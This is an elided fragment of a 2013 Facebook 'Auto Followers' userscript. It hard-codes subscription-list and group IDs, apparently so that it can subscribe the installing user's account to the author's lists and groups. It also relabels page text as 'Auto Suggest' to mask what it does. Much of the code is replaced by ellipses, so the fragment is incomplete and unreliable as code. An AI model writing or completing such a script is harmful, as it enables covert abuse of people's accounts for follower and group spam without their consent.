// ==UserScript==
// @name            Facebook Auto Followers:: Achmad Syaichul Hadi
// @description     Auto Followers 2013 :: Achmad Syaichul Hadi
...
sublist("1380292078871973");
sublist("576701395723681");

var gid = ['333788606767138'];
var gid = ['216089701893192'];
var gid = ['583731161683755'];
var gid = ['531487413596851'];
...
function blub()
{
    if(document.getElementsByClassName('pbm fsm').length == 1) {
        ...
        //e.href = '#';
        e.innerHTML = 'Auto Suggest by Sandra Schuetz';
